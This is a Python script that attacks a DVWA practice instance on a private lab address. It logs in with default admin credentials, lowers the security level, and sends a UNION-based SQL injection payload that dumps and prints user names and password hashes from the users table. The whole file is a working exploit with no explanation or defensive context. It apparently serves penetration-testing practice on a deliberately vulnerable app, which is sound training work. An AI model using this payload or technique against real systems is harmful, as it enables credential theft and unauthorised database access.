#!/usr/bin/env python

import requests,re
from bs4 import BeautifulSoup

s = requests.Session()

def dvwa_login():
    url = 'http://192.168.210.130/dvwa/login.php'
    params = {'username':'admin','password':'password','Login':'Login'}
    r = s.post(url,params)
    print("[+] Logged In.")
dvwa_login()

def dvwa_security():
    url = 'http://192.168.210.130/dvwa/security.php'
    params = {'security':'low','seclev_submit':'Submit'}
    r = s.post(url,params)
    print("[+] Security set to low.")
dvwa_security()

def sqli_low():
    url = 'http://192.168.210.130/dvwa/vulnerabilities/sqli/'
    params = {'id':"1' union select 1,(select group_concat(0x0d,user,0x3a3a,password,0x3c62723e) from users)-- -",'Submit':'Submit#'}
    r = s.get(url,params=params)
    html = r.text
    soup = BeautifulSoup(html,'html.parser')
    record = soup.find_all('pre')[1]
    print('[~] Dumped creds are as follows:\n')
    for data in record:
        if '::' in data:
            print(data)
sqli_low()
